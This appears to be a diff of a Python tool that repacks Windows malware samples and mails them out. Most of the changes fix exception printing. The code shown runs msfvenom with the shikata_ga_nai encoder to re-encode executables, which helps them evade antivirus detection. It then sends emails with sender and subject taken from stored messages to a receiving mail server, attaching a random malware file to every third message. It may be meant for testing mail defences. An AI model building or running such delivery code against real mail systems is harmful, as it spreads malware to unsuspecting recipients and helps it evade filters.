@@ -116,7 +116,7 @@ def malware_refresh(tg_api_key, tg_domain, malware_count):
         try:
             subprocess.call(['msfvenom p generic/custom PAYLOADFILE-' + filename + '.exe -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o ' + malware_folder + '/' + payloadname +'.exe'], shell=True)
         except Exception as e:
-            print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + e)
+            print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + str(e))
 
 def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
      message = MIMEMultipart()
@@ -159,34 +159,37 @@ def fire(msg_limit):
                                 sender = sender.split('<')[1]
                                 sender = sender.split('>')[0]
                             except Exception as e:
-                                print('Failed: ' + e)
+                                print('Failed: ' + str(e))
                                 failed_count = failed_count + 1
                                 continue
                         if 'Subject: ' in line:
                             try:
                                 subject = line.split(':')[1]
                             except Exception as e:
-                                print('Failed: ' + e)
+                                print('Failed: ' + str(e))
                                 failed_count = failed_count + 1
                                 continue
 
             except Exception as e:
-                print('Failed: ' + e)
+                print('Failed: ' + str(e))
                 failed_count = failed_count + 1
                 continue
 
             with open('message.current', 'r') as f:
                 msg = f.read()
+                msg = msg.encode('UTF-8')
                 smtpObj = smtplib.SMTP(receiving_mta)
                 try:
                     if not (msg_count % 3 == 0):
                         print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit))
+                        with smtplib.SMTP(receiving_mta) as server:
+                            server.sendmail(sender, msg_recipient, msg)
                     elif (msg_count % 3 == 0):
                         malware = random.choice(os.listdir(malware_folder + '/'))
-                        print('Attaching malware file ' + malware + ' to message: ' + subject)
+                        print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit) + ' (Attaching malware file ' + malware + ')')
                         send_malware(sender, msg_recipient, subject, malware_folder + '/' + malware, receiving_mta)
                 except Exception as e:
-                    print(e)
+                    print('Failed: ' + str(e))
                 msg_count = msg_count + 1
                 if msg_count == msg_limit:
                     print('Messages sent: ' + str(msg_count) + '\nFailed: ' + str(failed_count))
